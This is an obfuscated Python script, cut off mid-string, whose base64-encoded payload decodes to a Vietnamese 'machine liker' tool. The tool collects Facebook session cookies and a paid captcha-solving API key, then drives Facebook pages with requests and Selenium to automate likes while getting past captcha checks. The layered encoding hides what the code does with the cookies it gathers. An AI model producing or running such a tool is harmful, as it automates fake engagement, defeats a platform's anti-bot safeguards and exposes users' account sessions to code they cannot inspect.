# Python code obfuscated by www.development-tools.net 
 
from datetime import datetime
import base64, codecs
magic = 'DQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQppbXBvcnQgYmFzZTY0DQppbXBvcnQgd2FybmluZ3MsdGhyZWFkaW5nDQpmcm9tIHNpeC5tb3Zlcy51cmxsaWJfcGFyc2UgaW1wb3J0IHVybGpvaW4NCmltcG9ydCBvcyxqc29uLHJlcXVlc3RzLHN0cmluZywgYmFzZTY0LCBzaXgNCmZyb20gc2VsZW5pdW0gaW1wb3J0IHdlYmRyaXZlcg0KZnJvbSBzZWxlbml1bS53ZWJkcml2ZXIuY29tbW9uLmJ5IGltcG9ydCBCeQ0KaW1wb3J0IGRhdGV0aW1lDQoNCmZyb20gc2VsZW5pdW0gaW1wb3J0IHdlYmRyaXZlcg0KZnJvbSBzZWxlbml1bS53ZWJkcml2ZXIuY29tbW9uLmtleXMgaW1wb3J0IEtleXMNCmZyb20gc2VsZW5pdW0ud2ViZHJpdmVyLmNvbW1vbi5ieSBpbXBvcnQgQnkNCmZyb20gc2VsZW5pdW0ud2ViZHJpdmVyLmNocm9tZS5vcHRpb25zIGltcG9ydCBPcHRpb25zDQpmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdW5xdW90ZQ0KZnJvbSBhbnljYXB0Y2hhIGltcG9ydCAqDQoNCg0KIA0KDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCm9zLnN5c3RlbSgnY2xzJykNCmRlZiBsb2dvKCk6DQogICAgbG9nbyA9ICIiIlwwMzNbMTszNW0NCiAgICAgICAgICAgICDilojilojilojilZcgICDilojilojilZfilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgDQogICAgICAgICAgICAg4paI4paI4paI4paI4pWXICDilojilojilZHilZrilZDilZDilZDilZDilojilojilZfilojilojilZTilZDilojilojilojilojilZfilZrilZDilZDilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZcNCiAgICAgICAgICAgICDilojilojilZTilojilojilZcg4paI4paI4pWRIOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVkSAgICDilojilojilZTilZ3ilojilojilojilojilojilojilZTilZ0NCiAgICAgICAgICAgICDilojilojilZHilZrilojilojilZfilojilojilZHilojilojilZTilZDilZDilZDilZ0g4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICAg4paI4paI4pWU4pWdIOKWiOKWiOKVlOKVkOKVkOKVkOKVnSANCiAgICAgICAgICAgICDilojilojilZEg4pWa4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4pWa4paI4paI4paI4paI4paI4paI4pWU4pWdICAg4paI4paI4pWRICDilojilojilZEgICAgIA0KICAgICAgICAgICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAgICDilZrilZDilZ0gIOKVmuKVkOKVnSAiIiINCiAgICBwcmludChsb2dvKQ0KICAgIHByaW50KCdcMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT0nKQ0KICAgIHByaW50KCdcMDMzWzE7OTZtIENPREVSOiBcMDMzWzE7OTdtTkjDgk4gTkdIxKhBICAgICAgICAgICAgICAgICAgXDAzM1sxOzk2bVlPVVRVQkU6IFwwMzNbMTs5N21OSMOCTiBOR0jEqEEgT0ZGSUNJQUwgIFxuXDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209Jyk7DQogICAgcHJpbnQoJyBcMDMzWzE7OTZtTU9NTzogXDAzM1sxOzk3bTA4NTI0NDAwMTUgICAgICAgICAgICAgICAgXDAzM1sxOzk2bVRPT0w6IFwwMzNbMTs5N21NQUNISU5FIExJS0VSIEJZUEFTUyBDQVBUQ0hBJykNCiAgICBwcmludCgnXDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209XDAzM1sxOzM1bT1cMDMzWzE7OTdtPVwwMzNbMTszNW09XDAzM1sxOzk3bT1cMDMzWzE7MzVtPVwwMzNbMTs5N209JykNCiAgICBwcmludCgnICAgICAgIFwwMzNbMTs5Nm3CqSAyMDIxIC0gVGhp4bq/dCBL4bq/IFbDoCBW4bqtbiBIw6BuaCBC4bufaSBQaGFuIFRy4bqnbiBOaMOibiBOZ2jEqWEnKQ0KICAgIHByaW50KCdcMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT1cMDMzWzE7MzNtPVwwMzNbMTs5MW09XDAzM1sxOzMzbT1cMDMzWzE7OTFtPVwwMzNbMTszM209XDAzM1sxOzkxbT0nKQ0KbG9nbygpDQoNCmFwaWtleT0gc3RyKGlucHV0KCJ+IFwwMzNbMTszM21bXDAzM1sxOzM1beKck1wwMzNbMTszM21dIFwwMzNbMTs5N21OaOG6rXAgXDAzM1sxOzk3bUFwaSBLZXkgQW55Y2FwdGNoYTogXDAzM1sxOzM1bSIpKQ0KZGF0YSA9IHsiY2xpZW50S2V5IjphcGlrZXkgfQ0KdHJ5Og0KICAgICAgICAgICAgYmFsID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuYW55Y2FwdGNoYS5jb20vZ2V0QmFsYW5jZScsZGF0YT1kYXRhKS5qc29uKClbImJhbGFuY2UiXQ0KICAgICAgICAgICAgcHJpbnQoZiJ+IFwwMzNbMTszM21bXDAzM1sxOzk3bStcMDMzWzE7MzNtXSBcMDMzWzE7OTdtU+G7kSBCYWxhbmNlIFRyb25nIEFueWNhcHRjaGEgOiBcMDMzWzE7MzVte2JhbH0gJCIpDQpleGNlcHQ6DQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzM3bUFwaSBLZXkgQW55Y2FwdGNoYSBTYWkgISEiKQ0KICAgICAgICAgICAgZXhpdCgpDQp1c2VyID0gaW5wdXQoIn4gXDAzM1sxOzMzbVtcMDMzWzE7MzVt4pyTXDAzM1sxOzMzbV0gXDAzM1sxOzk3bU5o4bqtcCBVc2VyLUFnZW50OiBcMDMzWzE7MzVtIikNCnNvbHVvbmcgPSBpbnQoaW5wdXQoIn4gXDAzM1sxOzMzbVtcMDMzWzE7MzVt4pyTXDAzM1sxOzMzbV0gXDAzM1sxOzk3bU5o4bqtcCBT4buRIEx14buTbmc6IFwwMzNbMTszNW0iKSkNCmRhdGFfY29va2llX2ZiID0gW10NCmRhdGFfdXJsYmFpdmlldCA9IFtdDQpkYXRhX3R5cGUgPSBbXQ0KZm9yIGkgaW4gcmFuZ2Uoc29sdW9uZyk6DQogICAgY29va2llX2ZiYiA9IHN0cihpbnB1dChmIn4gXDAzM1sxOzMzbVtcMDMzWzE7MzVt4pyTXDAzM1sxOzMzbV0gXDAzM1sxOzk3bU5o4bqtcCBDb29raWUgRmFjZWJvb2sgVGjhu6kge2l9OiBcMDMzWzE7MzVtIikpDQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICdjb29raWUnOiBjb29raWVfZmJiDQogICAgICAgIH0NCiAgICAgICAgDQogICAgdHJ5Og0KICAgICAgICAgICAgZmluZF9kYXRhID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL20uZmFjZWJvb2suY29tLyIsIGhlYWRlcnM9aGVh'
love = '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'
